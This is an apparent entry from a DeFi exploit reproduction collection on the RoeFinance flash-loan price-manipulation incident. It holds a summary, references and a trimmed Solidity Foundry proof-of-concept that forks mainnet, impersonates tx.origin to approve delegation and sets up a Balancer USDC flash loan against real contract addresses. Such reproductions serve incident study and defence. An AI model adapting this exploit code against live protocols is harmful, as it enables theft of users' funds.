# [?] - RoeFinance - FlashLoan price manipulation

## Summary
Severity: Unknown
Chain: Ethereum
Component: RoeFinance
Published: 2023-01-11
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/RoeFinance_exp.sol
Type: defi-exploit-poc

## Details
Lost: $80k
References:
- https://twitter.com/BlockSecTeam/status/1613267000913960976
- https://etherscan.io/tx/0x927b784148b60d5233e57287671cdf67d38e3e69e5b6d0ecacc7c1aeaa98985b

```solidity
contract ContractTest is Test {
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ROE roe = ROE(0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x004375Dff511095CC5A197A54140a24eFEF3A416);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    vdWBTC_USDC_LP LP = vdWBTC_USDC_LP(0xcae229361B554CEF5D1b4c489a75a53b4f4C9C24);
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 roeUSDC = IERC20(0x9C435589f24257b19219ba1563e3c0D8699F27E9);
    IERC20 vdUSDC = IERC20(0x26cd328E7C96c53BD6CAA6067e08d792aCd92e4E);
    address roeWBTC_USDC_LP = 0x68B26dCF21180D2A8DE5A303F8cC5b14c8d99c4c;
    uint256 flashLoanAmount = 5_673_090_338_021;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_384_469);
        cheats.label(address(roe), "ROE");
        cheats.label(address(USDC), "USDC");
        cheats.label(address(WBTC), "WBTC");
        cheats.label(address(Pair), "Uni-Pair");
    }

    function testExploit() external {
        cheats.startPrank(address(tx.origin));
        LP.approveDelegation(address(this), type(uint256).max);
        cheats.stopPrank();
        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashLoanAmount;
        bytes memory userData = "";
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/RoeFinance_exp.sol_
